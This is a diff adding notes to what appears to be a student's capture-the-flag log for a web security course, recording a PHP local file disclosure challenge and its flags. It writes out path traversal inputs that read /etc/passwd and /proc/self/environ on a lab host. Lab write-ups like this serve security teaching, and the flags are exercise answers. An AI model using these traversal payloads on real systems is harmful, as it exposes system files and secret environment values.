@@ -14,3 +14,12 @@ used on admin page
 
 return flag
 COMP6443{at_th15_point_we_sh0uld_abolish_php_z5636887_b49iEeWQ1oe8nGL3ZYgx}
+
+
+PHP LFD V2
+tried https://php-lfd-v2.quoccacorp.com/?page=../../../../../etc/passwd
+worked.
+
+Used ../../../../proc/self/environ
+
+COMP6443{env_var5_can_h4v3_sensitiv3_content_z5636887_aS2IT2mI1uqonGYqTKi2}
